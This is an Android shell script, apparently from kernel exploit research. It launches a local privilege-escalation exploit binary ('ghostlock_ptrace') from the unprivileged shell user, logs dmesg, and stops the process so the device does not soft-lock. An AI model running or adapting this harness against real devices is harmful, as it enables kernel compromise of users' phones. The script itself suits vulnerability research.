#!/system/bin/sh
# GOT-W29 ptrace NT_PRFPREG carrier: unmodified-kernel write verification.
# Run via adb shell (uid 2000 shell, NOT su) so ghostlock_ptrace executes in
# the real attack context:
#   adb shell sh /data/local/tmp/run_ptrace_test.sh
#
# Safety: disables panic_on_oops/reboot, keeps a 0.5s sync loop so logs
# survive a crash, and SIGSTOPs the exploit instead of killing it (killing a
# process with a dangling pi_blocked_on runs the exit-time walk -> soft-lock).
set -u

DST=/data/local/tmp
cd "$DST" || exit 1

sh /sdcard/ghostlock-test/set_debug_no_reboot.sh 2>/dev/null

su -c 'sh /sdcard/ghostlock-test/sync_loop.sh >/dev/null 2>&1' &
SYNC_PID=$!
sleep 1

rm -f "$DST/ptrace_exe.log" "$DST/ptrace_poc.log" "$DST/ptrace_dmesg.log"
su -c "dmesg -w > '$DST/ptrace_dmesg.log' 2>&1" &
DMESG_PID=$!
sleep 1

echo "=== ptrace carrier run $(date +%T) uid=$(id -u) ==="
POC_LOG_FILE="$DST/ptrace_poc.log" \
GOT_FULL_RUN=1 \
GOT_VERIFY_WRITE=1 \
GOT_SLIDE_NO_RT=1 \
GOT_SLIDE_ATTEMPTS=5 \
GOT_SLIDE_HOLD=1 \
GOT_FAKELOCK_BSS=1 \
GOT_PTRACE_CARRIER=1 \
./ghostlock_ptrace > "$DST/ptrace_exe.log" 2>&1
echo "exploit_exit=$?" | tee -a "$DST/ptrace_exe.log"

# SIGSTOP, do NOT kill (dangling pi_blocked_on exit walk soft-locks the device)
pkill -STOP -f ghostlock_ptrace 2>/dev/null
kill "$SYNC_PID" 2>/dev/null
kill "$DMESG_PID" 2>/dev/null
su -c 'pkill -f sync_loop.sh 2>/dev/null; pkill -f "dmesg -w" 2>/dev/null'
sync

echo "=== boot_id now ==="
cat /proc/sys/kernel/random/boot_id
echo "=== poc.log tail ==="
tail -30 "$DST/ptrace_poc.log" 2>/dev/null
echo "=== exe.log tail ==="
tail -20 "$DST/ptrace_exe.log" 2>/dev/null
